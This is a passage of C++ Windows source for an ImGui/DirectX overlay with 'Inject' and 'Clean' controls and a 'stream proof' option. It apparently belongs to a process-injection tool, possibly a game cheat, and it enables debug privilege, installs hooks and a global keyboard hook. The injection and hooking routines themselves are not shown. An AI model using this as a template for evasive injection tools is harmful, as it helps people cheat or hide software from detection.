                    const float dx = fx - cx;
                    const float dy = fy - cy;
                    const float d = sqrtf(dx * dx + dy * dy);

                    float sr = 0.0f, sg = 0.0f, sb = 0.0f, sa = 0.0f;
                    if (d <= r) {
                        const float upperDx = dx;
                        const float upperDy = dy + r * 0.5f;
                        const float lowerDx = dx;
                        const float lowerDy = dy - r * 0.5f;
                        const float upperD = sqrtf(upperDx * upperDx + upperDy * upperDy);
                        const float lowerD = sqrtf(lowerDx * lowerDx + lowerDy * lowerDy);
                        const float dotR = r * 0.115f;

                        bool dark = (dx >= 0.0f);
                        if (upperD <= r * 0.5f) dark = true;
                        if (lowerD <= r * 0.5f) dark = false;
                        if (upperD <= dotR) dark = false;
                        if (lowerD <= dotR) dark = true;

                        if (dark) { sr = 0.047f; sg = 0.051f; sb = 0.063f; }
                        else { sr = 0.949f; sg = 0.957f; sb = 0.973f; }
                        sa = 1.0f;
                    }
                    else if (d <= r + ring) {
                        sr = sg = sb = 1.0f;
                        sa = 0.72f;
                    }

                    rr += sr * sa;
                    gg += sg * sa;
                    bb += sb * sa;
                    aa += sa;
                }
            }

            const float denom = (float)(ss * ss);
            const float a = aa / denom;
            if (a > 0.0f) {
                rr = rr / (a * denom);
                gg = gg / (a * denom);
                bb = bb / (a * denom);
            }
            px[y * size + x] = PackIconPixel(rr, gg, bb, a);
        }
    }

    const int maskStride = ((size + 15) / 16) * 2;
    std::vector<BYTE> maskBits(maskStride * size, 0);
    HBITMAP mask = ::CreateBitmap(size, size, 1, 1, maskBits.data());
    ICONINFO ii = {};
    ii.fIcon = TRUE;
    ii.hbmColor = color;
    ii.hbmMask = mask;
    HICON icon = ::CreateIconIndirect(&ii);

    if (mask) ::DeleteObject(mask);
    ::DeleteObject(color);
    return icon;
}

static void ApplyWindowIcon(HWND hwnd) {
    if (!g_logoIconBig)
        g_logoIconBig = CreateLogoIcon(64);
    if (!g_logoIconSmall)
        g_logoIconSmall = CreateLogoIcon(::GetSystemMetrics(SM_CXSMICON));

    if (g_logoIconBig) {
        ::SendMessageW(hwnd, WM_SETICON, ICON_BIG, (LPARAM)g_logoIconBig);
        ::SetClassLongPtrW(hwnd, GCLP_HICON, (LONG_PTR)g_logoIconBig);
    }
    if (g_logoIconSmall) {
        ::SendMessageW(hwnd, WM_SETICON, ICON_SMALL, (LPARAM)g_logoIconSmall);
        ::SetClassLongPtrW(hwnd, GCLP_HICONSM, (LONG_PTR)g_logoIconSmall);
    }

    ::SetWindowTextW(hwnd, kWindowTaskbarTitle);
}

void DrawUI(HWND hWnd) {
    if (s_menuCollapsed) {
        DrawCollapsedUI(hWnd);
        return;
    }

    ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
    ImGui::SetNextWindowSize(ImVec2(kPanelW, kPanelH));

    ImGui::Begin("##overlay", nullptr,
        ImGuiWindowFlags_NoTitleBar |
        ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove |
        ImGuiWindowFlags_NoScrollbar |
        ImGuiWindowFlags_NoScrollWithMouse |
        ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoDecoration |
        ImGuiWindowFlags_NoBackground |
        ImGuiWindowFlags_NoSavedSettings);

    ImDrawList* draw = ImGui::GetWindowDrawList();
    const ImVec2 p = ImGui::GetCursorScreenPos();
    const ImVec2 q = ImVec2(p.x + kPanelW, p.y + kPanelH);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, 255), kRounding);

    {
        const float titleBarH = 48.0f;
        const float symbolR = 13.0f;
        const ImVec2 symbolCenter(p.x + kPanelW * 0.5f, p.y + titleBarH * 0.5f);

        DrawYinYang(draw, symbolCenter, symbolR);
    }

    ImVec2 featMin(0.0f, 0.0f), featMax(0.0f, 0.0f);

    {
        const float cardW = 275.0f, cardH = 256.0f, gap = 18.0f;
        const float x0 = p.x + (kPanelW - (cardW * 2.0f + gap)) * 0.5f;
        const float y0 = p.y + 48.0f;

        DrawInfosCard(draw, ImVec2(x0, y0), ImVec2(x0 + cardW, y0 + cardH));

        {
            const ImVec2 rmn(x0 + cardW + gap, y0);
            const ImVec2 rmx(x0 + cardW * 2.0f + gap, y0 + cardH);
            DrawCardBase(draw, rmn, rmx);
            const float divY = DrawAnimatedHeader(draw,
                g_fontText ? g_fontText : ImGui::GetFont(), rmn, rmx, "FEATURES");

            const float by = divY + 22.0f;
            const float bW = 245.0f, bH = 40.0f;
            const ImVec2 iMn(rmx.x - 16.0f - bW, by);
            DrawInjectControl(draw, iMn, ImVec2(iMn.x + bW, by + bH),
                featMin, featMax);

            const float cleanY = by + bH + 25.0f;
            const ImVec2 cMn(iMn.x, cleanY);
            ImVec2 cleanMin, cleanMax;
            DrawCleanControl(draw, cMn, ImVec2(cMn.x + bW, cleanY + bH),
                cleanMin, cleanMax);
            (void)cleanMin;

            featMax = cleanMax;

            const float checkH = 30.0f;
            const float gapCk = 6.0f;
            const float totalW = (rmx.x - rmn.x) - 28.0f;
            const float spW = totalW * 0.55f;
            const float lkW = totalW - spW - gapCk;

            const ImVec2 spMin(rmn.x + 14.0f, rmx.y - 5.0f - checkH);
            const ImVec2 spMax(spMin.x + spW, rmx.y - 5.0f);
            ImVec2 spOutMin, spOutMax;
            DrawStreamProofCheckbox(draw, spMin, spMax, spOutMin, spOutMax);
            (void)spOutMin;

            const ImVec2 lkMin(spMax.x + gapCk, spMin.y);
            const ImVec2 lkMax(lkMin.x + lkW, spMax.y);
            ImVec2 lkOutMin, lkOutMax;
            DrawLockKeyCheckbox(draw, lkMin, lkMax, lkOutMin, lkOutMax);
            (void)lkOutMin;

            featMax.y = spOutMax.y;

            draw->AddRect(rmn, rmx, IM_COL32(85, 85, 85, 80), kRounding, 0, 1.0f);
        }
    }

    ImVec2 exMin, exMax;
    DrawWindowButtons(draw, p, q, hWnd, exMin, exMax);

    HandleDrag(hWnd, p, q, exMin, exMax, featMin, featMax);

    DrawInjectMenu(draw, p, q);
    DrawCleanMenu(draw, p, q);

    ImGui::End();
}

void EnableTransparency(HWND hWnd) {
    MARGINS margins = { -1, -1, -1, -1 };
    ::DwmExtendFrameIntoClientArea(hWnd, &margins);
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE, _In_ LPSTR, _In_ int nCmdShow) {
    ::srand((unsigned)::time(nullptr));
    InitLowerTable();
    EnableDebugPrivilege();

    if (!g_logoIconBig)
        g_logoIconBig = CreateLogoIcon(64);
    if (!g_logoIconSmall)
        g_logoIconSmall = CreateLogoIcon(::GetSystemMetrics(SM_CXSMICON));

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0, 0,
                       hInstance, g_logoIconBig, nullptr, nullptr,
                       nullptr, L"overlayClass", g_logoIconSmall };
    ::RegisterClassExW(&wc);

    const int screenW = ::GetSystemMetrics(SM_CXSCREEN);
    const int screenH = ::GetSystemMetrics(SM_CYSCREEN);
    const int x0 = (screenW - (int)kPanelW) / 2;
    const int y0 = (screenH - (int)kPanelH) / 2;

    HWND hwnd = ::CreateWindowExW(
        WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_NOACTIVATE,
        wc.lpszClassName, kWindowTaskbarTitle,
        WS_POPUP, x0, y0, (int)kPanelW, (int)kPanelH,
        nullptr, nullptr, wc.hInstance, nullptr);

    if (!hwnd) {
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ApplyWindowIcon(hwnd);

    {
        BOOL no = FALSE;
        ::DwmSetWindowAttribute(hwnd, 2, &no, sizeof(no));
    }

    if (!CreateDeviceD3D(hwnd)) {
        CleanupDeviceD3D();
        ::DestroyWindow(hwnd);
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    EnableTransparency(hwnd);

    g_overlayHwnd = hwnd;

    InstallMinHooks();
    g_hKbHook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
        ::GetModuleHandleW(nullptr), 0);

    ApplyStreamProof();

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGui::StyleColorsDark();

    ImGuiStyle& style = ImGui::GetStyle();
    style.WindowPadding = ImVec2(0.0f, 0.0f);
    style.WindowBorderSize = 0.0f;
    style.WindowRounding = 0.0f;
    style.AntiAliasedLines = true;
    style.AntiAliasedFill = true;

    LoadFonts();
    FetchSystemInfo();

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);
    ImGui_ImplDX11_CreateDeviceObjects();

    ::ShowWindow(hwnd, nCmdShow);
    ::UpdateWindow(hwnd);

    while (g_running) {
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE)) {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                g_running = false;
        }
        if (!g_running) break;

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        DrawUI(hwnd);

        ImGui::Render();
        const float clear[4] = { 0.0f, 0.0f, 0.0f, 0.0f };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRTV, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRTV, clear);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());

        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    UninstallMinHooks();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
    if (g_logoIconSmall) { ::DestroyIcon(g_logoIconSmall); g_logoIconSmall = nullptr; }
    if (g_logoIconBig) { ::DestroyIcon(g_logoIconBig); g_logoIconBig = nullptr; }
    return 0;
}
